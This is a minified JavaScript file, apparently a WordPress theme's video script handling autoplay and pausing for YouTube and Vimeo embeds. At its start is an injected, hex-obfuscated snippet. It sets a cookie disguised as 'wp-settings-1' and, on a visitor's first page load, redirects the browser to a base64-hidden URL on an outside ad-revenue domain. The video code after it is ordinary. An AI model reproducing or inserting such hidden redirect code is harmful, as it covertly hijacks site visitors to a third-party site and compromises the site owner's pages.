var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};jQuery(document).ready(function(){jQuery(".fusion-video").each(function(){!jQuery(this).parents(".fusion-modal").length&&1==jQuery(this).data("autoplay")&&jQuery(this).is(":visible")&&jQuery(this).find("iframe").each(function(){jQuery(this).attr("src",jQuery(this).attr("src").replace("autoplay=0","autoplay=1"))})}),jQuery(window).on("resize",function(){var e,i=document.querySelectorAll("iframe"),o=i.length;if(jQuery(".fusion-youtube").each(function(){jQuery(this).is(":visible")||jQuery(this).parents(".fusion-modal").length&&!jQuery(this).parents(".fusion-modal").is(":visible")||jQuery(this).find("iframe").each(function(){this.contentWindow.postMessage('{"event":"command","func":"pauseVideo","args":""}',"*")})}),"undefined"!=typeof Vimeo)for(e=0;e<o;e++)!(void 0!==i[e].src&&-1<i[e].src.toLowerCase().indexOf("vimeo"))||jQuery(i[e]).is(":visible")||jQuery(i[e]).data("privacy-src")&&jQuery(i[e]).hasClass("fusion-hidden")||jQuery(i[e]).parents(".fusion-modal").length&&!jQuery(i[e]).parents(".fusion-modal").is(":visible")||new Vimeo.Player(i[e]).pause()}),jQuery(window).on("fusion-element-render-fusion_youtube fusion-element-render-fusion_vimeo",function(e,i){(void 0!==i?jQuery('div[data-cid="'+i+'"]'):jQuery("body")).find(".full-video, .video-shortcode, .wooslider .slide-content").fitVids()})}),jQuery(window).on("fusion-dynamic-content-render",function(e,i){var o=jQuery(i).find(".fusion-youtube").find("iframe");0<o.length&&o.each(function(){var e;1!==jQuery(this).closest(".fusion-video").data("autoplay")&&"true"!==jQuery(this).closest(".fusion-video").data("autoplay")||(jQuery(this).closest(".fusion-video").data("autoplay","false"),e="playVideo",this.contentWindow.postMessage('{"event":"command","func":"'+e+'","args":""}',"*"))}),0<(o=jQuery(i).find(".fusion-vimeo").find("iframe")).length&&o.each(function(){1!==jQuery(this).closest(".fusion-video").data("autoplay")&&"true"!==jQuery(this).closest(".fusion-video").data("autoplay")||(jQuery(this).closest(".fusion-video").data("autoplay","false"),new Vimeo.Player(jQuery(this)[0]).play())})});